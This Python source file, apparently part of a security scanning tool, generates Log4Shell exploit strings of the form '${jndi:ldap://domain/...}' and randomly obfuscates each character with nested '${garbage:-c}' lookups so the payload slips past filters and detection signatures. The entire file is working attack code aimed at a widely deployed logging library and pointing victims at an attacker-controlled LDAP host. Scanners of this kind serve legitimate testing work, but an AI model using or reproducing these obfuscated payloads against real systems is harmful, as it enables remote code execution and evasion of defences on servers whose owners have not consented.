import random
from random import getrandbits
from xing.utils import random_choices


def gen_log4j_payload(domain, payload_type=random_choices(4)):
    chars = f"${{jndi:ldap://{domain}/{payload_type}}}"
    lst = [
        confuse_chars(char)
        if char not in "${}"
        and not getrandbits(1)
        else char
        for char in chars
    ]
    return ''.join(str(s) for s in lst)


def confuse_chars(char):
    garbageCount = random.randint(1, 3)
    i = 0
    garbage = ''
    lst = []
    while i < garbageCount:
        garbageLength = random.randint(1, 3)
        garbageWord = random_choices(garbageLength)
        i += 1
        lst.append(garbageWord)
        lst.append(":")
        garbage = ''.join(lst)
    return f"${{{garbage}-{char}}}"
